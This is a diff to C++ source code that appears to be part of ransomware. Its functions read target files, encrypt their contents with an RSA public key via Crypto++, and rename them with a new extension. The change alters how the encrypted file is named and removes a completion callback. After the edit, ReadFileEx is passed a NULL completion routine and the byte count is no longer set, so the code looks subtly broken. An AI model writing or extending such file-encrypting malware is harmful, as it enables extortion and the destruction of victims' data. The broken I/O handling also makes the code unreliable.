@@ -1,12 +1,6 @@
 #include "pch.h"
 #include "Helper.h"
 
-DWORD gBytesTransferred = 0;
-
-VOID CALLBACK FileIOCompletionRoutine(DWORD dwErrorCode, DWORD dwNumberOfBytesTransfered, LPOVERLAPPED lpOverlapped) {
-	gBytesTransferred = dwNumberOfBytesTransfered;
-}
-
 BOOL EncryptFileContent(std::wstring TargetFile, std::wstring FileExtension, CryptoPP::RSA::PublicKey& PublicKey)
 {
 	std::vector<uint8_t> fileContent;
@@ -41,7 +35,10 @@ BOOL EncryptFileContent(std::wstring TargetFile, std::wstring FileExtension, Cry
 		return FALSE;
 	}
 
-	std::wstring TargetFileEncrypted = TargetFile + FileExtension;
+	size_t lastindex = TargetFile.find_last_of(L".");
+	std::wstring rawname = TargetFile.substr(0, lastindex);
+
+	std::wstring TargetFileEncrypted = rawname + FileExtension;
 	if (!MoveFileW(TargetFile.data(), TargetFileEncrypted.data())) {
 		return FALSE;
 	}
@@ -78,11 +75,10 @@ BOOL ReadTargetFile(std::wstring TargetFile, std::vector<uint8_t>& FileContent)
 
 	FileContent.resize(dwFileSize);
 
-	if (!ReadFileEx(hFile, FileContent.data(), dwFileSize, &ol, FileIOCompletionRoutine)) {
+	if (!ReadFileEx(hFile, FileContent.data(), dwFileSize, &ol, NULL)) {
 		return FALSE;
 	}
 
-	dwBytesRead = gBytesTransferred;
 	CloseHandle(hFile);
 	return TRUE;
 }
